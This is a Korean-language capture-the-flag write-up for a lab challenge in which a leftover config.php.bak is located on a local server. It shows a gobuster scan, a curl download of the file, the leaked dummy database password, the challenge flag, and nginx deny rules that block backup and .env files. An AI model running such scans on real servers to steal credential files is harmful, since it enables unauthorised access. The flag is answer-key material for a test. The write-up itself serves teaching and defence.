+++
title = "VulnABLE CTF [LUXORA] Write-up: Info Disclosure 🥉 Bronze"
description = "LUXORA 플랫폼의 기본 Information Disclosure 취약점을 통한 백업 파일(.bak) 탈취 롸잇업"
date = 2026-03-14
[extra]
categories = "pentesting"
tags = ["CTF", "LUXORA", "Info Disclosure", "Bronze", "Backup Files", "Write-up"]
+++

# VulnABLE CTF [LUXORA] Write-up: Info Disclosure 🥉 Bronze

## 🎯 챌린지 개요
- **카테고리**: Crypto & Secrets Layer (Information Disclosure)
- **난이도**: 🥉 Bronze
- **타겟 경로**: `/info-disc/bronze`
- **목표**: 개발자가 실수로 웹 서버 디렉터리에 남겨둔 백업 파일(`.bak`, `.old`, `.swp` 등)을 디렉터리 브루트포싱 도구로 찾아내어 다운로드하고, 파일 내부에 하드코딩된 데이터베이스 비밀번호를 획득하라.

---

## 🕵️‍♂️ 1. 정보 수집 및 디렉터리 스캐닝 (Reconnaissance)

정보 유출(Information Disclosure)은 공격자가 어떤 화려한 기술을 쓰는 것이 아니라, 개발자의 실수나 설정 오류를 부지런히 찾아내는 과정입니다.

`/info-disc/bronze` 페이지는 평범한 로그인 화면입니다. 소스코드 보기(Ctrl+U)나 개발자 도구를 열어봐도 특별한 힌트는 보이지 않습니다.

### 💡 디렉터리 및 파일 브루트포싱
웹 서버에 숨겨진 파일이 있는지 찾기 위해 `gobuster` 나 `dirsearch` 를 사용합니다. 특히 텍스트 에디터(Vim, Nano)가 남기는 임시 파일이나 개발자가 백업용으로 남긴 확장자를 집중적으로 스캔합니다.

```bash
$ gobuster dir -u http://localhost:3000/info-disc/bronze \
    -w /usr/share/wordlists/dirb/common.txt \
    -x php,bak,old,txt,env,swp
```

**[검색 결과]**
```text
/index.php (Status: 200)
/login.php (Status: 200)
/config.php.bak (Status: 200)  <-- 빙고!
```

---

## 💥 2. 취약점 식별 및 중요 정보 획득 (Exploitation)

스캔 결과에서 `config.php.bak` 이라는 파일이 200 OK 응답을 반환했습니다.
일반적으로 `.php` 파일은 웹 서버가 실행(Execute)하여 결과(HTML)만 브라우저에 보여주지만, `.bak` 확장자는 웹 서버 설정에 "실행할 파일"로 등록되어 있지 않으므로 **파일의 원본 소스코드가 그대로(Raw text) 다운로드**됩니다.

### 💡 파일 다운로드
브라우저 주소창에 `http://localhost:3000/info-disc/bronze/config.php.bak` 를 입력하거나 `curl` 명령어로 가져옵니다.

```bash
$ curl http://localhost:3000/info-disc/bronze/config.php.bak
```

### 🔍 서버의 응답
```php
<?php
// Database configuration - DO NOT UPLOAD TO GITHUB
$db_host = "127.0.0.1";
$db_user = "root";
$db_pass = "SuperSecretDbPassword123!";
$db_name = "luxora_prod";

// Admin secret flag
$flag = "FLAG{INFO_🥉_BACKUP_FILE_LEAK_A1B2C3}";
?>
```

---

## 🚩 3. 롸잇업 결론 및 플래그

개발자가 서버에서 직접 코드를 수정하거나 파일을 복사할 때 무심코 남긴 백업 파일 하나가, 서버 전체의 제어권을 넘겨주는 가장 위험한 정보 유출 루트가 됨을 증명했습니다.

**🔥 획득한 플래그:**
`FLAG{INFO_🥉_BACKUP_FILE_LEAK_A1B2C3}`

### 🛡️ 취약점 원인 및 패치 방안 (Remediation)
운영(Production) 환경의 웹 루트 디렉터리에 애플리케이션의 실행과 무관한 파일(`.bak`, `.sql`, `.env`, `.git`)이 존재하는 것 자체가 가장 큰 문제입니다.

* **안전한 패치 가이드 (파일 접근 제어 및 배포 프로세스 개선)**
1. **웹 서버 접근 제어 (Nginx/Apache)**: 소스코드 확장자 외의 불필요한 백업 파일, 환경변수 파일에 대한 외부 접근을 정규식으로 원천 차단(Deny)해야 합니다.
   ```nginx
   # Nginx 설정: 숨김 파일 및 백업 확장자 차단
   location ~ \.(bak|config|sql|env|old|swp|git)$ {
       deny all;
   }
   ```
2. **안전한 CI/CD 파이프라인 구축**: 개발자가 FTP나 SSH로 운영 서버에 붙어서 직접 파일을 수정하는 관행을 버려야 합니다. Git과 CI/CD(Jenkins, GitHub Actions 등) 도구를 연동하여, 빌드된 최종 산출물(Artifact)만 서버에 배포되도록 구성해야 임시 파일이 남는 것을 방지할 수 있습니다.